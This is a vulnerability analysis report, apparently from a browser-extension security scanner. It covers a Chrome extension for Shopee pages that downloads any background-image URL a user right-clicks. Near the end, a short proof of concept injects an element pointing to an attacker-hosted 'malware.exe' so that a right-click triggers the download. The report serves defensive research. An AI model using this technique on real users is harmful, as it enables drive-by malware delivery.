# CoCo Analysis: nhadaejjnocjihemigokmobhcoappohb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_contextmenu → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nhadaejjnocjihemigokmobhcoappohb/opgen_generated_files/cs_0.js
Line 467-474: contextmenu event listener extracts backgroundImage URL from event.target.style
Line 472: Sends imageUrl via chrome.runtime.sendMessage

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nhadaejjnocjihemigokmobhcoappohb/opgen_generated_files/bg.js
Line 965-973: Message handler receives imageUrl and calls chrome.downloads.download

**Code:**

```javascript
// Content script - contentscript.js
document.addEventListener("contextmenu", (event) => {
  const target = event.target; // ← attacker-controlled via DOM
  if (target.style.backgroundImage.indexOf("url") != -1){
    event.preventDefault();
    const imageUrl = getBackgroundImageUrl(target);
    chrome.runtime.sendMessage({
      action: "downloadImage",
      imageUrl // ← attacker-controlled URL from backgroundImage
    });
  }
});

function getBackgroundImageUrl(element) {
  const backgroundImageStyle = element.style.backgroundImage;
  return backgroundImageStyle.slice(5, -2).replace(/"/g, "");
}

// Background script - background.js
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "downloadImage") {
    const imageUrl = message.imageUrl; // ← attacker-controlled URL
    chrome.downloads.download({ url: imageUrl }, () => { // ← Arbitrary download
      console.log("Image downloaded");
      playDownloadCompleteAudio();
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (contextmenu)

**Attack:**

```javascript
// On a Shopee page (*.shopee.co.id/*), inject a malicious element:
const maliciousElement = document.createElement('div');
maliciousElement.style.backgroundImage = 'url("https://attacker.com/malware.exe")';
document.body.appendChild(maliciousElement);

// When user right-clicks on this element, the extension will:
// 1. Extract the malicious URL from backgroundImage
// 2. Send it to background script
// 3. Download the malware file to user's computer
```

**Impact:** An attacker controlling a Shopee webpage can trigger arbitrary file downloads to the user's computer by injecting elements with malicious URLs in their backgroundImage style property. When the user right-clicks (contextmenu) on such elements, the extension downloads the file without proper validation. This could be used to deliver malware, phishing pages, or other malicious content.
